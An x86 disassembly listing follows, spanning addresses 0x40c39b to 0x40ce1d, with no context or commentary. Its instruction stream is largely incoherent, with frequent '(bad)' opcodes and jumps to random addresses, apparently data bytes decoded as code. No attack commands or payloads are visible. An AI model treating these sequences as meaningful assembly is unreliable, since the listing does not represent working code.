  40c39b:	fnstsw WORD PTR [ebx+edi*1-0x67]
  40c39f:	xlat   BYTE PTR ds:[ebx]
  40c3a0:	sbb    dh,dl
  40c3a2:	cdq    
  40c3a3:	(bad)  
  40c3a4:	(bad)  
  40c3a5:	aas    
  40c3a6:	dec    ebp
  40c3a7:	fmul   DWORD PTR [eax-0x12fb59c]
  40c3ad:	pop    dx
  40c3af:	sbb    eax,0x452d5ea6
  40c3b4:	add    cl,al
  40c3b6:	(bad)  
  40c3b7:	xor    al,0x41
  40c3b9:	jmp    0x3f30d1ea
  40c3be:	or     eax,0x51b4fed8
  40c3c3:	mov    edi,0x8044
	...
  40c3f0:	or     eax,0x166488d8
  40c3f5:	sar    dh,1
  40c3f7:	es fcom st(6)
  40c3fa:	inc    ax
  40c3fc:	add    BYTE PTR [eax+eax*1],bl
  40c3ff:	push   ss
  40c400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c401:	retf   
  40c402:	test   BYTE PTR [esi],0x6d
  40c405:	(bad)  
  40c406:	je     0x40c3fd
  40c408:	xor    eax,0x4cfea981
  40c40d:	in     al,0x84
  40c40f:	or     DWORD PTR [ebp-0x2a],eax
  40c412:	inc    BYTE PTR [ebx+0x43b7433d]
  40c418:	add    edx,edi
  40c41a:	std    
  40c41b:	xchg   esp,eax
  40c41c:	sub    eax,0x2cd6fece
  40c421:	push   eax
  40c422:	or     al,0xc1
  40c424:	cmp    al,0x4
  40c426:	inc    esi
  40c428:	pop    edx
  40c429:	loopne 0x40c416
  40c42b:	mov    dh,0xc
  40c42d:	(bad)  
  40c42e:	imul   ebp,ecx,0x28599ba5
  40c434:	cmp    dl,dh
  40c436:	mov    ah,0x99
  40c438:	je     0x40c410
  40c43a:	(bad)  
  40c43b:	sahf   
  40c43c:	mul    BYTE PTR [edx-0x18]
  40c43f:	popf   
  40c440:	add    eax,0xb660fed6
  40c445:	ret    
  40c446:	test   BYTE PTR [eax],0xc0
  40c449:	mov    DWORD PTR [edx+0x0],ebp
  40c44c:	das    
  40c44d:	sbb    DWORD PTR [edx+0x41],0xf0b58997
	...
  40c47c:	add    BYTE PTR [eax],al
  40c47e:	or     BYTE PTR [ecx-0x29650001],cl
  40c484:	out    0xd9,al
  40c486:	iret   
  40c487:	mov    edi,edi
  40c489:	mov    edx,ebx
  40c48b:	and    eax,0xdcf0fff7
  40c490:	mov    esp,0xff8918e4
  40c495:	add    BYTE PTR [edx-0x8427e29],cl
  40c49b:	nop
  40c49c:	(bad)  
  40c49d:	call   DWORD PTR [edi+0xe]
  40c4a0:	and    DWORD PTR fs:[edx+0x50fff776],0x5a
  40c4a8:	je     0x40c506
  40c4aa:	xchg   esp,eax
  40c4ab:	dec    ebx
  40c4ac:	call   0xc9f5a8
  40c4b1:	je     0x40c467
  40c4b3:	icebp  
  40c4b4:	(bad)  
  40c4b5:	inc    DWORD PTR [eax+0x4c]
  40c4b8:	push   DWORD PTR [ebp+0x1f]
  40c4bb:	jb     0x40c4f8
  40c4bd:	mov    ds:0xb5ff8c10,al
  40c4c2:	adc    edx,DWORD PTR [edi+edi*8+0x70e10ff]
  40c4c9:	call   0x40022e
  40c4ce:	lock dec ebp
  40c4d0:	call   0xffccc5cc
  40c4d5:	jne    0x40c4a6
  40c4d7:	jno    0x40c45a
  40c4d9:	mov    ds:0xb5ff8b90,al
  40c4de:	sti    
  40c4df:	xchg   ebx,eax
  40c4e0:	(bad)  
  40c4e1:	inc    DWORD PTR [eax]
	...
  40c50b:	add    al,ah
  40c50d:	or     eax,0x3d54e807
  40c512:	(bad)  
  40c513:	(bad)  
  40c514:	ds in  eax,dx
  40c516:	jbe    0x40c4f8
  40c518:	test   eax,0x13ff30e4
  40c51d:	int3   
  40c51e:	sbb    ah,BYTE PTR [ebp-0x24]
  40c521:	push   esp
  40c522:	xor    edi,edi
  40c524:	shr    edi,cl
  40c526:	cmp    bh,bh
  40c528:	add    DWORD PTR [edi+esi*4+0x7],0xff651466
  40c530:	jno    0x40c566
  40c532:	ja     0x40c518
  40c534:	jno    0x40c562
  40c536:	xor    eax,ebp
  40c538:	daa    
  40c539:	fbstp  TBYTE PTR [eax]
  40c53b:	call   FWORD PTR [ecx+0x56]
  40c53e:	and    al,0xf7
  40c540:	push   ecx
  40c541:	xchg   esp,eax
  40c542:	sbb    al,0x2e
  40c544:	mov    ds:0x8bff318c,eax
  40c549:	xchg   edi,eax
  40c54a:	cmp    edi,edi
  40c54c:	cmp    DWORD PTR [ebx-0x1b],ebp
  40c54f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c550:	xor    DWORD PTR [esi+0x31],esi
  40c553:	mov    ch,0x16
  40c555:	jbe    0x40c588
  40c557:	call   DWORD PTR [esi]
  40c559:	retf   
  40c55a:	call   FWORD PTR gs:[ecx]
  40c55d:	pop    esi
  40c55e:	ja     0x40c53c
  40c560:	or     esi,edx
  40c562:	das    
  40c563:	call   0xff71eca3
  40c568:	add    DWORD PTR [eax-0x420608cc],edx
  40c56e:	das    
  40c56f:	jne    0x40c571
	...
  40c599:	add    BYTE PTR [edx-0x4b],al
  40c59c:	mov    ch,0x7
  40c59e:	(bad)  
  40c59f:	outs   dx,DWORD PTR ds:[esi]
  40c5a0:	xor    bh,bh
  40c5a2:	loope  0x40c549
  40c5a4:	jne    0x40c596
  40c5a6:	rcr    DWORD PTR [ebp-0x213017d1],1
  40c5ac:	das    
  40c5ad:	dec    ecx
  40c5af:	xchg   DWORD PTR [ecx+ebp*8],ebp
  40c5b2:	outs   dx,DWORD PTR ds:[esi]
  40c5b3:	add    al,0x30
  40c5b5:	(bad)  
  40c5b6:	mov    ecx,0xa6301c5b
  40c5bb:	data16 js 0x40c5c1
  40c5be:	mov    ds:0x2fa1ffaa,al
  40c5c4:	bound  ebx,QWORD PTR [edi]
  40c5c6:	mov    ebp,0x919d849f
  40c5cb:	inc    edx
  40c5cc:	(bad)  
  40c5cd:	xor    BYTE PTR [ebx],dl
  40c5cf:	arpl   WORD PTR [ecx+0x6dd4dc04],ax
  40c5d5:	jp     0x40c5da
  40c5d7:	xlat   BYTE PTR ds:[ebx]
  40c5d8:	shl    BYTE PTR [esp+edx*1],1
  40c5db:	sbb    ch,cl
  40c5dd:	xor    BYTE PTR [ebx],dh
  40c5df:	cwde   
  40c5e0:	mov    al,ds:0xd3d561c2
  40c5e5:	sti    
  40c5e6:	popa   
  40c5e7:	int    0x43
  40c5e9:	xor    BYTE PTR [ecx+0x43],dl
  40c5ec:	cmp    cl,ch
  40c5ee:	(bad)  
  40c5ef:	pop    edx
  40c5f0:	rol    DWORD PTR ds:0x30695b3e,0xb3
  40c5f7:	arpl   WORD PTR [ecx],dx
  40c5f9:	daa    
  40c5fa:	xor    edx,esp
  40c5fc:	sbb    eax,0x30
	...
  40c625:	add    BYTE PTR [eax],al
  40c627:	add    BYTE PTR [ebx+0x39b615d7],dh
  40c62d:	ret    
  40c62e:	mul    BYTE PTR [ebp+0x19]
  40c631:	aam    0x2f
  40c633:	inc    ebp
  40c634:	cmp    bl,BYTE PTR [ebx-0x6c]
  40c637:	jl     0x40c653
  40c639:	fisubr DWORD PTR [edi+ebx*1]
  40c63c:	or     esp,edx
  40c63e:	in     eax,dx
  40c63f:	jge    0x40c5c4
  40c641:	xlat   BYTE PTR ds:[ebx]
  40c642:	cmp    BYTE PTR [edi],ch
  40c644:	imul   ebp,DWORD PTR [ebx-0x22],0xffffffb9
  40c648:	xor    eax,0x3e9486c3
  40c64d:	pop    ebx
  40c64e:	loop   0x40c693
  40c650:	dec    ecx
  40c651:	fidiv  WORD PTR [ebp+0x4]
  40c654:	ds pop ebx
  40c656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c657:	leave  
  40c658:	rcr    DWORD PTR [edx+0x0],1
  40c65b:	jmp    0x2508219d
  40c660:	jbe    0x40c636
  40c662:	push   es
  40c663:	jmp    0x134107a5
  40c668:	inc    edx
  40c669:	inc    ecx
  40c66a:	add    BYTE PTR [ebx],al
  40c66c:	cmp    ah,dh
  40c66e:	inc    esp
  40c66f:	xchg   ebp,eax
  40c670:	jb     0x40c658
  40c672:	test   BYTE PTR [ebp+0x49],bh
  40c675:	aam    0xfe
  40c677:	sbb    DWORD PTR [ecx+0x4e],ebx
  40c67a:	clc    
  40c67b:	jbe    0x40c644
  40c67d:	iret   
  40c67e:	out    0x4f,eax
  40c680:	rcr    BYTE PTR [edx+0x0],cl
  40c683:	repnz std 
  40c685:	dec    esi
  40c686:	add    dl,BYTE PTR [edx-0x79]
  40c689:	out    0x84,al
  40c68b:	inc    ebp
	...
  40c6b4:	add    BYTE PTR [eax],al
  40c6b6:	sub    esp,edx
  40c6b8:	(bad)  
  40c6b9:	mov    ecx,0x3ef3ddbe
  40c6be:	and    esp,edx
  40c6c0:	dec    edi
  40c6c1:	xchg   DWORD PTR ds:[ebx-0x1],esp
  40c6c5:	mov    esp,0x8640bb41
  40c6ca:	imul   edx,edx,0xca6a6c88
  40c6d0:	(bad)  
  40c6d1:	push   ds
  40c6d2:	and    eax,0xbccb7413
  40c6d7:	adc    ah,ch
  40c6d9:	push   ss
  40c6da:	imul   edx,edx,0x43427cff
  40c6e0:	add    cl,ch
  40c6e2:	sub    BYTE PTR [ecx],dl
  40c6e4:	(bad)  
  40c6e5:	cmp    al,0x5e
  40c6e7:	retf   0xeefe
  40c6ea:	sub    BYTE PTR [eax],cl
  40c6ec:	lock fisub WORD PTR [eax]
  40c6ef:	sar    dh,cl
  40c6f1:	push   esp
  40c6f2:	jmp    0xfed2:0x10a0b4ba
  40c6f9:	xchg   esp,eax
  40c6fa:	or     eax,0xf800feca
  40c6ff:	jbe    0x40c6f3
  40c701:	mov    ds:0x45ff8188,eax
  40c706:	(bad)  
  40c707:	jne    0x40c689
  40c709:	push   DWORD PTR [edx-0x75]
  40c70c:	call   0x9efe22
  40c711:	leave  
  40c712:	aad    0xd2
  40c714:	(bad)  
  40c715:	push   esp
  40c716:	sbb    al,0x72
  40c718:	add    esp,0x0
	...
  40c743:	add    bl,cl
  40c745:	hlt    
  40c746:	(bad)  
  40c747:	imul   ebx,DWORD PTR [edi-0x50f78a7f],0x8ffa159
  40c751:	dec    edi
  40c752:	inc    ebp
  40c753:	cld    
  40c754:	aas    
  40c755:	pop    edi
  40c756:	pop    ebx
  40c757:	inc    ecx
  40c758:	xor    DWORD PTR [di],0xfe97afc3
  40c75f:	inc    BYTE PTR [edx+0x825e6d6]
  40c765:	cmp    edi,0x3fa55f68
  40c76b:	add    BYTE PTR [edi+0x5c],ch
  40c76e:	add    BYTE PTR [eax],al
  40c770:	xlat   BYTE PTR ds:[ebx]
  40c771:	xor    BYTE PTR [ebp+0x8],0x7f
  40c775:	ins    DWORD PTR es:[edi],dx
  40c776:	(bad)  
  40c777:	call   FWORD PTR [eax-0xa]
  40c77a:	das    
  40c77b:	pop    ebx
  40c77c:	(bad)  
  40c77d:	pop    ebp
  40c77e:	push   DWORD PTR ds:0x401654
  40c784:	dec    eax
  40c785:	adc    eax,DWORD PTR [edi]
  40c787:	call   0x4048b3
  40c78c:	scas   eax,DWORD PTR es:[edi]
  40c78d:	(bad)  
  40c78e:	pop    ecx
  40c78f:	inc    ecx
  40c790:	pop    ss
  40c791:	test   BYTE PTR [eax],0x0
  40c794:	out    0xdd,eax
  40c796:	(bad)  
  40c797:	jne    0x40c788
  40c799:	jne    0x40c789
  40c79b:	dec    BYTE PTR [eax]
  40c79d:	cmp    bh,0x75
  40c7a0:	ds test al,0x2c
  40c7a3:	jne    0x40c7eb
  40c7a5:	pushf  
  40c7a6:	mov    al,ss:0x0
	...
  40c7d0:	add    BYTE PTR [eax],al
  40c7d2:	rcr    DWORD PTR [eax-0x3bbd3dc6],1
  40c7d8:	aad    0x8a
  40c7da:	ror    BYTE PTR [eax],cl
  40c7dc:	mov    bh,0xb
  40c7de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7df:	add    esp,DWORD PTR [ebp-0x1]
  40c7e2:	mov    cl,0xcc
  40c7e4:	inc    edx
  40c7e5:	je     0x40c7df
  40c7e7:	imul   ebx,DWORD PTR [edx-0x2d3c00a6],0xffffffe7
  40c7ee:	or     bl,BYTE PTR [ecx]
  40c7f0:	sub    eax,0xd473eeff
  40c7f5:	les    ebx,FWORD PTR ds:[bp+di]
  40c7f9:	mov    esi,0x40c97016
  40c7fe:	ds je  0x40c82e
  40c801:	jne    0x40c849
  40c803:	sub    al,0xf7
  40c805:	retf   
  40c806:	imul   esi,DWORD PTR [eax],0xc43f67cc
  40c80c:	sbb    edi,DWORD PTR [esi+0x40c80ae6]
  40c812:	ds hlt 
  40c814:	sub    esi,DWORD PTR [ebp+0x36]
  40c817:	sub    al,0xe3
  40c819:	retf   
  40c81a:	inc    ecx
  40c81b:	mov    ah,cl
  40c81d:	addr16 cmp al,0xc2
  40c820:	sbb    edi,DWORD PTR [esi+0x40c798a6]
  40c826:	adc    ch,BYTE PTR ds:[esi*2-0x3400a5ca]
  40c82e:	sbb    DWORD PTR [edx+0x1c],esp
  40c831:	push   ss
  40c832:	fstp   QWORD PTR [ecx+0x2d]
  40c835:	leave  
	...
  40c85e:	add    BYTE PTR [eax],al
  40c860:	cld    
  40c861:	retf   0x5502
  40c864:	mov    ch,0x56
  40c866:	add    esp,0x6a02dcfa
  40c86c:	push   edi
  40c86d:	pop    ebx
  40c86e:	out    0xb6,al
  40c870:	inc    ecx
  40c871:	ret    
  40c872:	and    BYTE PTR [ecx+eiz*8-0x30],ah
  40c876:	pop    edi
  40c877:	(bad)  
  40c878:	aad    0x45
  40c87a:	repz sub al,0x4b
  40c87d:	arpl   cx,dx
  40c87f:	or     ecx,0xffffffd0
  40c882:	mov    ebp,0x3bd01c99
  40c887:	cld    
  40c888:	mov    eax,ds:0xb12cae49
  40c88d:	inc    ebp
  40c88e:	add    eax,0x9163332d
  40c893:	lahf   
  40c894:	mov    al,ds:0x132c95d0
  40c899:	iret   
  40c89a:	lea    esi,[esi+0x641ac339]
  40c8a0:	mov    eax,edx
  40c8a2:	scas   eax,DWORD PTR es:[edi]
  40c8a3:	inc    ecx
  40c8a4:	cmp    bl,BYTE PTR [ebx+0x1c]
  40c8a7:	jns    0x40c913
  40c8a9:	fsub   QWORD PTR [edi+ebp*1+0x1bf54671]
  40c8b0:	inc    esp
  40c8b1:	clc    
  40c8b2:	pop    ebp
  40c8b3:	sub    al,0x35
  40c8b5:	fwait
  40c8b6:	in     eax,0x87
  40c8b8:	popf   
  40c8b9:	pop    ebx
  40c8ba:	jmp    0x45578fc2
  40c8bf:	or     bl,0x6a
  40c8c2:	jmp    0x40c97e
	...
  40c8eb:	add    BYTE PTR [eax],al
  40c8ed:	add    BYTE PTR [ebx],dh
  40c8ef:	sar    BYTE PTR [ebx+0x2d463913],1
  40c8f5:	sbb    edx,edi
  40c8f7:	clc    
  40c8f8:	and    eax,0x1d15b72c
  40c8fd:	fwait
  40c8fe:	mov    edx,0x1903a833
  40c903:	inc    esi
  40c904:	or     eax,0x5f94b1b
  40c909:	sub    al,0x6e
  40c90b:	inc    ebx
  40c90c:	jmp    0x51da14
  40c911:	cdq    
  40c912:	sub    al,BYTE PTR [esi+0x8]
  40c915:	add    ecx,ecx
  40c917:	mov    ds:0xdd4ae6fe,al
  40c91c:	mov    eax,ds:0xb34315de
  40c921:	xor    al,BYTE PTR [ebx]
  40c923:	sar    ch,1
  40c925:	push   esp
  40c926:	es ret 
  40c928:	adc    ecx,DWORD PTR [edi+0x514fd015]
  40c92e:	cmp    ebx,DWORD PTR [ebx-0x11]
  40c931:	ja     0x40c8c5
  40c933:	shl    BYTE PTR [ecx+eiz*8+0x55],1
  40c937:	dec    esp
  40c938:	enter  0x55a6,0xc3
  40c93c:	pusha  
  40c93d:	dec    ebx
  40c93e:	push   ebp
  40c93f:	shl    BYTE PTR [edi+0x70],1
  40c942:	mov    DWORD PTR [edx],ebx
  40c944:	add    BYTE PTR [esi+0x7ae7d3cf],cl
  40c94a:	pop    ds
  40c94b:	sar    dh,1
  40c94d:	sbb    DWORD PTR [edx+0x86fecf],esp
	...
  40c97b:	add    ah,ah
  40c97d:	sub    bh,bh
  40c97f:	hlt    
  40c980:	jne    0x40c939
  40c982:	push   ecx
  40c983:	xor    DWORD PTR ds:0xdba9e7d0,edx
  40c989:	iret   
  40c98a:	inc    cl
  40c98c:	sbb    esi,DWORD PTR [ecx+eax*2]
  40c98f:	jmp    0x523d0fb8
  40c994:	lock cmc 
  40c996:	(bad)  
  40c997:	ds push 0x37
  40c99a:	add    ecx,ebp
  40c99c:	push   esp
  40c99d:	or     eax,0x56ef2e50
  40c9a2:	call   0xff0f2f7f
  40c9a7:	adc    DWORD PTR ds:0x6516fef9,esi
  40c9ad:	dec    eax
  40c9ae:	cld    
  40c9af:	add    DWORD PTR ds:0x4000fef9,ebp
  40c9b5:	nop
  40c9b6:	ret    0x170c
  40c9b9:	lods   al,BYTE PTR ds:[esi]
  40c9ba:	mov    esp,ebp
  40c9bc:	fs sbb edi,esp
  40c9bf:	push   0xffffffe7
  40c9c1:	lock sbb bh,bh
  40c9c4:	mov    cl,bh
  40c9c6:	out    0x39,al
  40c9c8:	pusha  
  40c9c9:	cmp    edi,0x6a832a89
  40c9cf:	add    BYTE PTR [ebp+0x5d],bh
  40c9d2:	push   DWORD PTR [ebp-0x31]
  40c9d5:	jb     0x40c9f9
  40c9d7:	inc    DWORD PTR [eax-0x2ff957f]
  40c9dd:	mov    ch,0xfd
  40c9df:	jne    0x40c9e1
	...
  40ca09:	add    BYTE PTR [edi-0x1f00e98e],bl
  40ca0f:	sub    DWORD PTR [edx+0x0],0x75ff634d
  40ca16:	lahf   
  40ca17:	jb     0x40ca23
  40ca19:	inc    eax
  40ca1b:	sub    DWORD PTR [eax-0x19],0x69fe985c
  40ca22:	popf   
  40ca23:	xor    DWORD PTR [ebp+0x8],0xfffe7dbf
  40ca2a:	loopne 0x40ca1d
  40ca2c:	in     eax,0x5b
  40ca2e:	xchg   esi,eax
  40ca2f:	pop    edx
  40ca30:	push   0x23
  40ca32:	add    BYTE PTR [ebx],cl
  40ca34:	pop    es
  40ca35:	call   0x404e3d
  40ca3a:	jg     0x40cab5
  40ca3c:	pop    ebx
  40ca3d:	inc    ecx
  40ca3e:	push   edi
  40ca3f:	lock sbb bh,bh
  40ca42:	mov    dl,dl
  40ca44:	out    0xdd,al
  40ca46:	jno    0x40c9c9
  40ca48:	(bad)  
  40ca49:	(bad)  
  40ca4a:	jmp    0x2072:0x2f75ff75
  40ca51:	lahf   
  40ca52:	inc    eax
  40ca53:	or     ecx,0x2c03ec2
  40ca59:	push   ebp
  40ca5a:	(bad)
  40ca5d:	les    edx,FWORD PTR [esi]
  40ca5f:	int    0x28
  40ca61:	push   DWORD PTR [ebx-0x6afd90a]
  40ca67:	dec    esi
  40ca68:	adc    edi,edi
  40ca6a:	imul   esi,DWORD PTR [eax+0xb81a],0x0
	...
  40ca95:	add    BYTE PTR [eax],al
  40ca97:	add    BYTE PTR [ebx-0x1f4fd3d],bh
  40ca9d:	mov    esp,0xc43f477d
  40caa2:	add    al,bh
  40caa4:	jnp    0x40ca52
  40caa6:	add    eax,DWORD PTR [eax]
  40caa8:	les    edi,FWORD PTR ds:[edi]
  40caab:	inc    ebp
  40caac:	retf   0x10c
  40caaf:	add    BYTE PTR [esi],bh
  40cab1:	sbb    al,BYTE PTR [edx+ebp*2]
  40cab4:	sbb    al,BYTE PTR ds:[edx+ebp*2]
  40cab8:	ds inc edi
  40caba:	mov    edi,0x7f3f0ef3
  40cabf:	hlt    
  40cac0:	xchg   ecx,eax
  40cac1:	in     al,0x28
  40cac3:	push   eax
  40cac4:	xchg   ecx,eax
  40cac5:	data16 sub al,0xff
  40cac8:	adc    ebx,eax
  40caca:	sbb    ecx,DWORD PTR [edx+0xb02c3b3]
  40cad0:	jle    0x40caa1
  40cad2:	std    
  40cad3:	call   0x438e1c
  40cad8:	(bad)  
  40cad9:	aam    0xbb
  40cadb:	inc    eax
  40cadc:	ds sub eax,0x88660faf
  40cae2:	pusha  
  40cae3:	call   DWORD PTR [ecx+0x13]
  40cae6:	jl     0x40cab8
  40cae8:	mov    ebx,0x41f7303e
  40caed:	mov    esp,ss
  40caef:	push   ecx
  40caf0:	es jp  0x40cb53
  40caf3:	push   DWORD PTR [ecx]
  40caf5:	cmp    al,0x7f
  40caf7:	lock xor DWORD PTR [esi+eiz*1+0x29],ebx
	...
  40cb24:	add    BYTE PTR [eax],al
  40cb26:	push   ss
  40cb27:	jnp    0x40cb71
  40cb29:	sub    DWORD PTR [ecx],ebx
  40cb2b:	inc    edx
  40cb2c:	jmp    0xa87046cc
  40cb31:	add    ecx,DWORD PTR [ecx]
  40cb33:	pop    es
  40cb34:	stc    
  40cb35:	xor    BYTE PTR [ecx],al
  40cb37:	int    0xfd
  40cb39:	scas   al,BYTE PTR es:[edi]
  40cb3a:	inc    ebp
  40cb3b:	ret    
  40cb3c:	int3   
  40cb3d:	pop    edi
  40cb3e:	icebp  
  40cb3f:	int3   
  40cb40:	pop    edi
  40cb41:	jg     0x40cb1d
  40cb43:	(bad)  
  40cb44:	in     eax,0x28
  40cb46:	push   esp
  40cb47:	pop    ebx
  40cb48:	push   ecx
  40cb49:	(bad)  
  40cb4a:	jne    0x40cb66
  40cb4c:	jmp    0xd60c5679
  40cb51:	sub    cl,cl
  40cb53:	int3   
  40cb54:	cmp    edi,eax
  40cb56:	fldenv [edx-0x7b]
  40cb59:	sub    BYTE PTR [ecx-0x56e4941e],bh
  40cb5f:	int3   
  40cb60:	lods   eax,DWORD PTR ds:[esi]
  40cb61:	test   bl,ch
  40cb63:	mov    edi,0x5ba1289d
  40cb68:	adc    eax,0xe95b21f4
  40cb6d:	sbb    al,dl
  40cb6f:	inc    ebx
  40cb70:	ffreep st(7)
  40cb72:	(bad)  
  40cb73:	pop    edx
  40cb74:	xchg   BYTE PTR [esi-0x6e],ch
  40cb77:	les    edi,FWORD PTR [ebp+0x28]
  40cb7a:	jns    0x40cbc2
  40cb7c:	loope  0x40cb99
  40cb7e:	mov    dl,0xa2
  40cb80:	ins    DWORD PTR es:[edi],dx
  40cb81:	sub    dh,dl
  40cb83:	pop    ecx
  40cb84:	jmp    0x1846ba1
  40cb89:	enter  0x0,0x0
	...
  40cbb1:	add    BYTE PTR [eax],al
  40cbb3:	add    dh,bh
  40cbb5:	pop    edx
  40cbb6:	push   esi
  40cbb7:	outs   dx,BYTE PTR ds:[esi]
  40cbb8:	(bad)  
  40cbb9:	les    ecx,FWORD PTR [ebp+0x28]
  40cbbc:	dec    ecx
  40cbbd:	inc    esi
  40cbbe:	icebp  
  40cbbf:	sbb    ebx,DWORD PTR [edx-0x42d7c25e]
  40cbc5:	or     eax,0xcc6e4100
  40cbca:	(bad)  
  40cbcb:	jmp    0xe9a947a9
  40cbd0:	cmp    eax,0x1791bdbc
  40cbd5:	xor    BYTE PTR [ecx-0x17],al
  40cbd8:	pushw  es
  40cbda:	call   0xff0d21f5
  40cbdf:	jl     0x40cbe6
  40cbe1:	mov    ah,0x82
  40cbe3:	xor    BYTE PTR [esi],ah
  40cbe5:	int3   
  40cbe6:	addr16 call 0x81fe8829
  40cbec:	xor    eax,0x18e9412f
  40cbf1:	push   es
  40cbf2:	call   0xff0cedcd
  40cbf7:	pop    esp
  40cbf8:	shl    BYTE PTR [ebx-0x33de5f96],cl
  40cbfe:	(bad)  
  40cbff:	jl     0x40cc27
  40cc01:	(bad)  
  40cc02:	(bad)  
  40cc03:	mov    esi,0xb6a03d5a
  40cc08:	pop    ecx
  40cc09:	int3   
  40cc0a:	mov    ah,0xc1
  40cc0c:	pop    ecx
  40cc0d:	int3   
  40cc0e:	(bad)  
  40cc0f:	xchg   ecx,eax
  40cc10:	fucomp st(3)
  40cc12:	(bad)  
  40cc13:	sahf   
  40cc14:	popa   
  40cc15:	push   es
  40cc16:	lock sahf 
	...
  40cc40:	add    BYTE PTR [eax],al
  40cc42:	pop    ecx
  40cc43:	int3   
  40cc44:	(bad)  
  40cc45:	adc    al,0x86
  40cc47:	int3   
  40cc48:	je     0x40cc3b
  40cc4a:	and    eax,0x217efe07
  40cc4f:	int3   
  40cc50:	mov    ah,0x79
  40cc52:	and    esp,ecx
  40cc54:	inc    BYTE PTR [ecx+0x66feeba9]
  40cc5a:	sbb    DWORD PTR [esi],edx
  40cc5c:	clc    
  40cc5d:	push   eax
  40cc5e:	sbb    cl,ch
  40cc60:	(bad)  
  40cc61:	push   esi
  40cc62:	sbb    DWORD PTR [esi-0x4],eax
  40cc65:	inc    ecx
  40cc66:	popf   
  40cc67:	(bad)  
  40cc69:	call   DWORD PTR [edi-0x72]
  40cc6c:	ret    0x270c
  40cc6f:	lods   al,BYTE PTR ds:[esi]
  40cc70:	mov    esp,ebp
  40cc72:	push   0x97e80b0c
  40cc77:	cmp    edi,edi
  40cc79:	jmp    FWORD PTR [edi+ebx*1]
  40cc7c:	je     0x40ccb7
  40cc7e:	scas   eax,DWORD PTR es:[edi]
  40cc7f:	mov    esp,0xaf27415a
  40cc84:	out    0xc,al
  40cc86:	add    DWORD PTR [edx-0x1958af01],0xfffffffe
  40cc8d:	dec    DWORD PTR [eax+0x41]
  40cc90:	push   0xfe9fcb0e
  40cc95:	dec    edi
  40cc96:	fmul   DWORD PTR [ebx]
  40cc98:	pop    es
  40cc99:	call   0x40539f
  40cc9e:	jg     0x40cc87
  40cca0:	(bad)  
  40cca1:	(bad)  
  40cca2:	clc    
  40cca3:	inc    eax
  40cca4:	push   0x18
	...
  40cccd:	add    BYTE PTR [eax],al
  40cccf:	add    BYTE PTR [ebx],bl
  40ccd1:	mov    al,ds:0xbf84ffe
  40ccd6:	pop    es
  40ccd7:	call   0x405361
  40ccdc:	jg     0x40cd43
  40ccde:	lahf   
  40ccdf:	(bad)  
  40cce0:	fadd   DWORD PTR [edi-0x5468f73e]
  40cce6:	mov    esp,ebp
  40cce8:	and    al,0x8a
  40ccea:	cld    
  40cceb:	push   esi
  40ccec:	push   eax
  40cced:	in     eax,0xfe
  40ccef:	imul   ecx,DWORD PTR [ecx+eax*4-0x3a50f78b],0x46f8ff9b
  40ccfa:	inc    ebp
  40ccfb:	cld    
  40ccfc:	fmul   st(2),st
  40ccfe:	inc    ebp
  40ccff:	dec    eax
  40cd00:	push   ss
  40cd01:	pop    edi
  40cd02:	mov    edi,DWORD PTR ds:0x4006ac
  40cd08:	out    0xc0,eax
  40cd0a:	dec    BYTE PTR [esi]
  40cd0c:	cmp    BYTE PTR ds:[edx+0x0],ch
  40cd10:	ds mov ah,0x9a
  40cd13:	add    ah,dl
  40cd15:	repnz add dl,BYTE PTR [esi+0x26]
  40cd19:	shl    BYTE PTR [esi+0x0],cl
  40cd1c:	ds mov ebp,0xf4787442
  40cd22:	cmp    BYTE PTR [eax],0x3e
  40cd25:	sar    DWORD PTR [esi-0x79],1
  40cd28:	ds mov ah,0x2
  40cd2b:	push   eax
  40cd2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd2d:	mov    ch,0xc6
  40cd2f:	inc    eax
  40cd30:	ds pop esp
  40cd32:	cwde   
  40cd33:	mov    DWORD PTR [eax],eax
	...
  40cd5d:	add    BYTE PTR [esi],bh
  40cd5f:	mov    ah,0xc8
  40cd61:	add    bh,ah
  40cd63:	jecxz  0x40cd7f
  40cd65:	pusha  
  40cd66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd67:	shl    BYTE PTR [eax+edx*2],1
  40cd6a:	mov    ds,esp
  40cd6c:	add    al,BYTE PTR [eax]
  40cd6e:	rol    DWORD PTR [ecx],1
  40cd70:	pushf  
  40cd71:	or     eax,0x5004737a
  40cd76:	shl    DWORD PTR [esi],1
  40cd78:	cld    
  40cd79:	out    0x55,eax
  40cd7b:	cld    
  40cd7c:	and    al,0xff
  40cd7e:	data16 sub al,0x3
  40cd81:	add    BYTE PTR [ecx+0x12179c49],ch
  40cd87:	jae    0x40cd8d
  40cd89:	push   eax
  40cd8a:	test   eax,0x9e7fc8e
  40cd8f:	or     al,0x25
  40cd91:	jmp    DWORD PTR [esi-0x6e007aad]
  40cd97:	fadd   st(0),st
  40cd99:	test   DWORD PTR [si-0x3d],ecx
  40cd9e:	call   0x3ecc0a8e
  40cda3:	mov    ah,0xf7
  40cda5:	mov    edi,0xe7cd07ea
  40cdaa:	inc    ebp
  40cdab:	sbb    esp,DWORD PTR ds:0xb95b0eff
  40cdb1:	fwait
  40cdb2:	pop    ecx
  40cdb3:	leave  
  40cdb4:	dec    ebp
  40cdb5:	data16 out 0x58,al
  40cdb8:	mov    ch,0xc2
  40cdba:	dec    ecx
  40cdbb:	sbb    DWORD PTR [esi-0x51],ecx
  40cdbe:	cmp    DWORD PTR [ebx+0x3c0e],esi
	...
  40cdec:	cmp    ecx,ecx
  40cdee:	mov    al,ds:0x465b3e9b
  40cdf3:	xchg   si,ax
  40cdf5:	arpl   WORD PTR [ebp+0x261921c2],cx
  40cdfb:	scas   eax,DWORD PTR es:[edi]
  40cdfc:	inc    ecx
  40cdfd:	mov    bl,0xfa
  40cdff:	cmp    edx,DWORD PTR [ecx]
  40ce01:	leave  
  40ce02:	add    BYTE PTR [ecx],cl
  40ce04:	test   eax,0x3f190dc8
  40ce09:	and    DWORD PTR [ecx-0x1a],ebp
  40ce0c:	stc    
  40ce0d:	dec    edi
  40ce0e:	add    edi,DWORD PTR [esi+0x6b298cf5]
  40ce14:	jmp    0xec65bbe1
  40ce19:	stc    
  40ce1a:	and    ch,bh
  40ce1c:	dec    eax
  40ce1d:	fisub  WORD PTR [ebx]
